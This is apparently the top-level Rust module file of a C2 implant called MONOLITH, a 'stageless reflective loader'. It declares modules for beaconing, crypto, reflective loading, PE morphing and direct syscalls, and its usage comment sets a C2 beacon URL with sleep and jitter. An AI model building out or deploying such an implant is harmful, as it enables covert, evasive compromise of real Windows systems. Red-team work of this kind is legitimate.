//! MONOLITH Native Agent - Stageless Reflective Loader
//!
//! Build:
//!   cargo build --release
//!
//! Usage:
//!   set MONOLITH_C2_URL=https://c2.example.com/c2/beacon
//!   set MONOLITH_SLEEP=60
//!   set MONOLITH_JITTER=30
//!   .\target\release\monolith-agent.exe

pub mod beacon;
pub mod crypto;
pub mod loader;
pub mod pe_morph;
pub mod syscall;

pub use beacon::Beacon;
pub use crypto::CryptoEngine;
pub use loader::ReflectiveLoader;
pub use pe_morph::PEMorpher;
